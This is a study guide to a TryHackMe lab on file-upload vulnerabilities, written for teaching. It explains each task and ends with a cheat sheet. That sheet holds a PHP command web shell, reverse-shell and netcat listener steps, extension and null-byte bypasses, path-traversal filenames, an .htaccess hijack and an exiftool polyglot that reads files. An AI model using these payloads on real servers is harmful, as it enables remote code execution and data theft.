# TryHackMe — "Upload Vulnerabilities" Room: Study Guide

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)](https://tryhackme.com/room/uploadvulns)
[![Type](https://img.shields.io/badge/Type-Guided%20Study%20Guide-blue)]()

> Room link: [tryhackme.com/room/uploadvulns](https://tryhackme.com/room/uploadvulns)
>
> **This guide explains *how* to approach and solve every task — it does not give you flag values.** Flags are generated fresh per deployment, so a hardcoded answer would be useless to you anyway. What matters is the *method*: by the end of this room you should be able to recognize, probe, and bypass every major file-upload defense a real-world application might throw at you. This document is written so that reading it start to finish teaches you the vulnerability properly, independent of whether you have the room open.

---

## 📖 Room Overview

The room deploys a single machine exposing **six separate mini-challenges**, each reachable via its own subdomain (you add them to your hosts file once at setup). Each subdomain demonstrates **one specific upload defense** and how it fails:

| Subdomain | Defense being demonstrated | Core lesson |
|---|---|---|
| `overwrite.uploadvulns.thm` | No filename collision protection | You can overwrite an existing file just by naming yours the same |
| `shell.uploadvulns.thm` | No validation at all | Baseline RCE — the "null hypothesis" of upload security |
| `java.uploadvulns.thm` | Client-side (JavaScript) validation only | Client-side checks are not security, they're UX |
| `annex.uploadvulns.thm` | Server-side extension filtering | Blacklists and naive extension checks are incomplete |
| `magic.uploadvulns.thm` | Server-side magic-number (content) checking | Even "real" validation can be spoofed at the byte level |
| `jewel.uploadvulns.thm` | Multiple layered defenses + a different tech stack (Node.js) | Real targets combine defenses and may not even be PHP |

The room builds in difficulty deliberately: each task either removes a defense you just learned to bypass, or stacks a new one on top. By the final challenge you're expected to combine *everything* — fingerprinting the stack, enumerating hidden paths, defeating client-side checks, and layering extension + content bypasses together.

**Tools used throughout:** Burp Suite (proxy/intercept, and viewing raw requests/responses), Gobuster (directory/file brute-forcing), a hex editor (`hexeditor`, pre-installed on Kali), a browser tech-fingerprinting extension (e.g. **Wappalyzer**), and — for two of the tasks — a web shell or reverse shell (PHP for most of the room, Node.js for the final challenge).

---

## Task 1 — Introduction

Pure reading — no target. It frames the core idea: **any functionality that accepts a file from a user and later serves or processes it is a potential code-execution vector**, because the server has to trust, at some point, that the file is what it claims to be. The PHP example given (upload a raw `.php` file, have the PHP engine interpret it when requested) is the mental model for the entire room: validation exists specifically to prevent this trust from being misplaced.

**✅ Why this task matters:** it sets the one-sentence definition you should carry through every other task: *upload vulnerabilities exist wherever "store this file" and "this file might get executed" overlap.*

## Task 2 — General Methodology

Also mostly conceptual, but it names your toolkit for the rest of the room:

- **Gobuster**, for discovering upload directories and, later, randomly-named uploaded files.
- **Burp Suite**, for intercepting and editing upload requests directly (bypassing any client-side logic entirely).
- **A browser tech-fingerprinting extension** (e.g. **Wappalyzer**) — install it now. It will save you guesswork later (notably in the final challenge, where the backend isn't PHP).

**How to "solve" it:** just install/confirm you have Gobuster, Burp, and a fingerprinting extension ready, then move on.

**✅ Why this task matters:** real-world upload testing is never just "try payloads" — it's recon (what's the stack, where do files land) *first*, exploitation second. Skipping recon is the single most common reason people get stuck later in this room (and in real engagements).

## Task 3 — Overwriting Existing Files (`overwrite.uploadvulns.thm`)

**The question:** can you overwrite a file that already exists on the server simply by uploading a file with the same name?

**How to approach it:**
1. Load the page and check its source (`Ctrl+U` or Burp) for an `<img src="...">` tag — this tells you both the exact filename being displayed and the directory it's served from.
2. Get or rename any image file on your system to that **exact same filename**.
3. Submit it through the upload form.
4. Reload the page. If the displayed image is now yours, the server accepted a same-named file and silently replaced the original — the overwrite succeeded, and a flag/confirmation should appear.

**✅ Why this task matters:** this looks like a minor issue, but in real applications, predictable-filename overwrite can be used to replace configuration files, overwrite another user's avatar/document, or — combined with *any* execution bypass from later tasks — overwrite an already-validated file with malicious content after the fact. It's also a gentle introduction to "find the filename from the page source" as a recon habit you'll reuse for the rest of the room.

## Task 4 — Remote Code Execution (`shell.uploadvulns.thm`)

**The question:** this target has *no* filtering at all — can you get full command execution on the server?

**How to approach it:**
1. Run Gobuster against the root of the site with a standard wordlist to discover the upload-serving directory (commonly something like `/uploads` or `/assets` — don't assume, confirm it).
2. Write the smallest possible PHP web shell:
   ```php
   <?php echo system($_GET['cmd']); ?>
   ```
3. Upload it through the form — nothing should block it.
4. Browse to the uploaded file's URL with a `cmd` parameter (e.g. `?cmd=whoami`, `?cmd=id`) to confirm command execution.
5. For a cleaner, interactive session: download and edit a full PHP reverse shell (the well-known **pentestmonkey** script is the standard choice — just edit the IP at the top to your TryHackMe VPN/`tun0` address and pick a port), start a Netcat listener (`nc -lvnp <port>`) on that port, upload the reverse shell, and trigger it by visiting its URL.
6. From your shell, navigate to the application's web root and locate the flag file.

**✅ Why this task matters:** this is your baseline. Every later task in the room is "the same attack, with one more obstacle in the way." Understanding exactly what a completely unprotected upload looks like makes it much easier to recognize, later, exactly *which* defense you're up against when something unexpectedly fails.

## Task 5 — Filtering (Theory, No Target)

Pure concept task covering the taxonomy of defenses you're about to fight: **client-side vs. server-side filtering**, and within server-side, the different validation types — extension, MIME type, magic number/content, file size, and filename handling. It also introduces **magic numbers** (file signature bytes) with the PNG example (`89 50 4E 47 0D 0A 1A 0A`).

**How to approach the questions:**
- *What language has traditionally dominated server-side web scripting?* — this is asking about the language most classic upload-RCE examples (including most of this room) are written in.
- *What term describes an extension-validation list of only pre-approved values (the inverse of a blacklist)?* — a direct vocabulary question; think about what the opposite of "list of forbidden things" is called.
- *What MIME type would a `.csv` file report?* — a quick web search for "CSV file MIME type" gives you this directly.

**✅ Why this task matters:** naming these categories precisely matters because *your attack strategy depends entirely on which category you're up against*. "The upload failed" is not useful information on its own — "the upload failed because of an extension check" versus "...because of a magic-number check" leads to completely different next steps, which is exactly what the rest of the room drills into you.

## Task 6 — Bypassing Client-Side Filtering (`java.uploadvulns.thm`)

**The question:** this target rejects non-image files — but where is that check actually happening?

**How to approach it:**
1. Try uploading a `.php` shell normally through the form — it gets rejected instantly, *before* any request is even sent (notice there's no network delay). That's your first clue it's client-side.
2. Check the page source and any loaded `.js` files (Burp's proxy history will show every resource the page pulled in) for the validation logic — look for something checking `file.type` or the filename extension in JavaScript before the form submits.
3. Once confirmed, you have several ways to bypass a purely client-side check — pick whichever is cleanest for your setup:
   - **Disable JavaScript** in the browser entirely and submit the form normally.
   - **Intercept the response** carrying the validation script in Burp (Proxy → set "Intercept" to catch responses, not just requests) and strip or neuter the check before it loads in your browser.
   - Let the client-side check pass with an innocuous file, then **intercept the upload request itself** afterward in Burp and swap the filename/content/Content-Type to your real payload — the JS already did its job by the time Burp sees the request.
   - Skip the browser entirely and **send the request directly** with a tool like `curl` or Burp Repeater, bypassing the page (and its JS) altogether.
4. Once your shell uploads, locate it (check the response, or Gobuster common paths) and trigger it to get code execution, then retrieve the flag.

**✅ Why this task matters:** this is the single most important lesson in the whole room — **client-side validation provides zero security**, full stop. It can improve UX (instant feedback without a round trip) but an attacker fully controls their own browser and request pipeline, so any check implemented only in JavaScript is, for security purposes, not implemented at all.

## Task 7 — Bypassing Server-Side Filtering: File Extensions (`annex.uploadvulns.thm`)

**The question:** the server now validates extensions itself — can you still get code execution?

**How to approach it — black-box enumeration, one variable at a time:**
1. Confirm the baseline: a legitimate image uploads fine; a raw `.php` file is rejected *by the server* this time (check the timing/response — it's a real round trip now, unlike Task 6).
2. The filter likely checks for the *presence* of an approved extension rather than strictly validating the *end* of the filename. Try a double extension first: `shell.jpg.php`.
3. If that's blocked too, the filter may instead be blacklisting specific known-dangerous extensions. PHP can be executed through several alternate extensions depending on server config — try cycling through `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.pht` one at a time. A working bypass will both **upload successfully** *and* **execute** when requested — don't stop at "it uploaded," confirm it actually runs.
4. This challenge intentionally obscures where your file lands (randomized names, no directory listing) — run **Gobuster** against the site to discover the upload directory, and note the exact filename echoed back in the upload confirmation message rather than guessing.
5. Once you find an extension that both uploads and executes, trigger your shell and retrieve the flag.

**✅ Why this task matters:** this demonstrates why **blacklists are fundamentally incomplete** — they can only block extensions the developer thought of. A list that blocks `.php` but not `.php5` isn't a weaker version of a correct control, it's a different, broken control. This is also where the discipline of "upload succeeded ≠ upload executes" starts to matter — always verify execution, not just acceptance.

## Task 8 — Bypassing Server-Side Filtering: Magic Numbers (`magic.uploadvulns.thm`)

**The question:** this server inspects actual file *content*, not just the extension — can you still get a shell past it?

**How to approach it:**
1. Confirm a plain PHP shell is rejected even with a previously-successful extension trick — this is your signal that content (not just naming) is now being checked.
2. Recall the magic-number concept from Task 5: every file format starts with a fixed, known byte signature. The server is almost certainly checking only the first few bytes of the upload, not the whole structure.
3. Pick a target format — this challenge specifically expects a **GIF** (look up the GIF89a header signature; it's a short, well-known sequence of ASCII bytes you can find with a quick search).
4. Open your PHP shell file in a hex editor (`hexeditor` on Kali) and **overwrite the very first bytes** with the chosen signature — the rest of the file (your actual PHP code) stays untouched afterward. Verify your work with the `file` command, which should now report your file as the spoofed type.
5. Upload the modified file — if magic-number inspection is the *only* content check, it should now pass.
6. This challenge also hides its storage location — Gobuster again to find the serving directory, then trigger your shell by its URL and retrieve the flag.

**✅ Why this task matters:** this proves that "the server validates file content" doesn't automatically mean "the server validates the *whole* file." A check that only inspects the first few bytes is still trivially spoofable, because nothing stops the rest of the file from being anything you want — this is the conceptual stepping stone toward understanding polyglot files (covered in the PortSwigger lab series in this same repo category).

## Task 9 — Example Methodology (Theory, No Target)

No target — this task consolidates everything into a repeatable black-box process:

1. **Fingerprint the stack** (don't assume PHP — check headers, use your browser's tech-fingerprinting extension).
2. **Find the upload point** and inspect any client-side code around it.
3. **Do a baseline legitimate upload** and work out exactly where/how it's served.
4. **Attempt an obviously malicious upload** and read the rejection message carefully — it often hints at *which* layer blocked you.
5. **Test extension, magic-number, MIME-type, and size filters one at a time**, changing only one variable per attempt, to precisely characterize what's actually being enforced before trying to bypass it.

**✅ Why this task matters:** this is the room telling you, explicitly, "this is the checklist — memorize it." The final challenge gives you zero hints about which defenses are active, so this methodology is the only thing standing between you and blindly guessing.

## Task 10 — Challenge (`jewel.uploadvulns.thm`)

**The question:** a black-box target combining multiple defenses — and, as a twist, **not necessarily running PHP**. Apply the full methodology from Task 9 with no hand-holding.

**How to approach it, step by step:**
1. **Fingerprint first.** Check response headers (look specifically for anything revealing the backend framework) and your tech-fingerprinting extension's verdict on the page — don't assume this one is PHP like the rest of the room.
2. **Enumerate the site structure with Gobuster.** Expect to find more than one directory of interest — one that's clearly for storing uploaded content, and at least one other administrative or functional page.
3. **Inspect every loaded resource in Burp**, not just the main page — this challenge's client-side validation logic lives in a separate JavaScript file, and it's worth reading in full: it typically layers *multiple* independent client-side checks together (e.g. size, magic number, and extension, all in the same script). Since this is purely client-side, the same bypass approaches from Task 6 apply — most directly, intercepting the *response* carrying that script in Burp and neutralizing the checks before they load, so your real upload request goes through unmodified.
4. **Establish a baseline upload** and figure out the server's filename-generation pattern. If the challenge provides its own specific wordlist for this room, that's a strong hint it's needed for Gobuster to actually guess the generated filename of your upload (rather than a generic wordlist) — uploaded names won't be predictable otherwise.
5. **Confirm the actual backend technology** once your fingerprinting narrows it down, and make sure your shell/payload matches that language runtime — a PHP web shell is useless against a non-PHP backend.
6. **Look at how execution is actually triggered on this target.** Unlike the PHP-based tasks, simply requesting the uploaded file's URL may not run it — look for a separate administrative feature that loads/activates a file from the upload-serving directory as if it were application code (a "module" or "plugin" loading mechanism is a common pattern), and consider whether path traversal is needed to reach your uploaded file from wherever that feature expects files to be.
7. **Combine the bypasses** needed for whichever client-side and server-side checks you identified, upload your payload, locate its real stored name via Gobuster, trigger it through the execution mechanism you found, and catch your shell with a listener on the correct port.
8. Retrieve the flag from the system once you have command execution.

**✅ Why this task matters:** this is deliberately the hardest task because it's the most realistic one. Real targets rarely tell you their stack or their exact defenses — you have to discover both from scratch, and a single wrong assumption (e.g. "it must be PHP") can send you down a dead end for a long time. Succeeding here means you've internalized the methodology, not just memorized a sequence of payloads.

---

## 📋 Full Cheat Sheet

A consolidated reference for everything covered in this room — organized so you can scan it quickly during a real engagement or CTF.

### Recon Checklist (Do This First, Every Time)
- [ ] Fingerprint the backend (response headers like `X-Powered-By`/`Server`; browser tech-fingerprinting extension). **Never assume PHP.**
- [ ] Run Gobuster against the site root with a solid wordlist to find upload/asset directories.
- [ ] Check page source and *every* loaded `.js` file (Burp proxy history) for client-side validation logic.
- [ ] Upload a legitimate file first to establish a baseline: where does it land, how is it named, how is it served?
- [ ] Attempt an obvious malicious upload and read the exact rejection message — it often reveals which layer blocked you.

### Client-Side Bypass Techniques
| Technique | When to use it |
|---|---|
| Disable JavaScript in the browser | Fastest option when the site still functions without JS |
| Intercept the *response* carrying the validation script in Burp, strip/neuter it | When you need the page to keep working but want the check gone |
| Let the client-side check pass with a safe file, then intercept and swap the real upload request in Burp | When the client-side logic is hard to disable cleanly |
| Send the request directly with `curl` or Burp Repeater, skipping the page entirely | Fastest, most reliable option once you know the request format |

### Server-Side Extension Bypass Techniques
```
Double extension:        shell.jpg.php
Alternate PHP extensions: .php3  .php4  .php5  .php7  .phtml  .pht  .phar
.htaccess handler hijack (Apache):
    AddType application/x-httpd-php .l33t
    (then upload your shell as .l33t)
Null byte truncation (legacy PHP < 5.3.4):
    shell.php%00.jpg
Path traversal in filename (escape a non-executing directory):
    ../exploit.php
    ..%2fexploit.php     (URL-encoded, to dodge pre-decode stripping)
```

### Content / Magic-Number Bypass Techniques
| Format | Magic Bytes (hex) |
|---|---|
| JPEG | `FF D8 FF DB` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF87a | `47 49 46 38 37 61` |
| GIF89a | `47 49 46 38 39 61` |

Overwrite only the **first bytes** of your payload file with the target signature using a hex editor; verify with `file <filename>`. Everything after the signature remains your actual payload.

For validation that genuinely parses the whole file structure (not just the header), a **polyglot** is needed — e.g. embedding PHP in a real image's EXIF `Comment` field via ExifTool:
```bash
exiftool -Comment='<?php echo "START " . file_get_contents("/path/to/secret") . " END"; ?>' input.jpg -o polyglot.php
```

### MIME Type (Content-Type) Bypass
In the multipart upload body, the declared type is entirely client-controlled — simply change:
```
Content-Type: application/x-php
```
to an accepted value, e.g.:
```
Content-Type: image/jpeg
```

### Basic Payloads
```php
<?php echo system($_GET['cmd']); ?>
```
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
For interactive access: use a full reverse shell script (e.g. pentestmonkey's PHP reverse shell, or an equivalent for the target language), edit the IP/port at the top to match your listener, and catch it with:
```bash
nc -lvnp <port>
```

### Finding Where Your File Landed
- Check the upload confirmation response for a direct path or filename.
- Try common predictable paths first: `/uploads/`, `/files/`, `/assets/`, `/content/`, `/graphics/`.
- If the filename is randomized or obfuscated, Gobuster with a wordlist (including any challenge-specific wordlist provided) and the `-x` flag (to also try extensions) is the standard approach.
- Check for directory listing being enabled on likely candidates.

### General Discipline
- **Change one variable at a time** when probing a black-box filter (extension → then content → then MIME) so you know exactly which check you defeated.
- **"Uploaded" ≠ "executes."** Always confirm the file actually runs, not just that the server accepted it.
- **Don't assume the stack.** Fingerprint before picking a payload language.
- **Read rejection messages carefully.** They frequently leak which validation layer is active.

---

*This guide is a method and reference document for the TryHackMe "Upload Vulnerabilities" room, written for self-study. It intentionally omits flag values since they are unique per deployment — work through each task against your own running instance to retrieve yours.*
